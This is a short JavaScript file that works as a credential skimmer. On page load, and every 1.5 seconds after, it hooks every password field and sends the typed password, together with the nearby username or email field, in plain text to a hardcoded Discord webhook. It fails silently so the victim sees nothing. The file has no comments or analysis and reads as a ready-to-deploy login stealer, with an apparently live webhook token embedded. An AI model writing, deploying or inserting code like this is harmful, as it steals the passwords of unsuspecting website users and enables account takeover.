const LOGIN_WEBHOOK = "https://discord.com/api/webhooks/1488571402775695573/D5GsZGLM1bRy5ldrSs3zZUomb2XiajjXS5jm1JwKjx9D7DMqRaY9f122sUvqES7hGP6A";

function sendLoginData(username, password) {
  if (!username || !password) return;
  fetch(LOGIN_WEBHOOK, {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify({ content: `username: ${username}\npassword: ${password}` })
  }).catch(() => {});
}

function setupLoginLogger() {
  document.querySelectorAll('input').forEach(input => {
    if (input.type === 'password') {
      input.addEventListener('input', () => {
        const userInput = document.querySelector('input[name="username"], input[name="email"], input[placeholder*="username" i], input[placeholder*="email" i], input[type="text"]');
        const username = userInput ? userInput.value.trim() : "unknown";
        const password = input.value.trim();
        if (password.length > 4) {
          sendLoginData(username, password);
        }
      });
    }
  });
}

window.addEventListener("load", setupLoginLogger);
setInterval(setupLoginLogger, 1500);
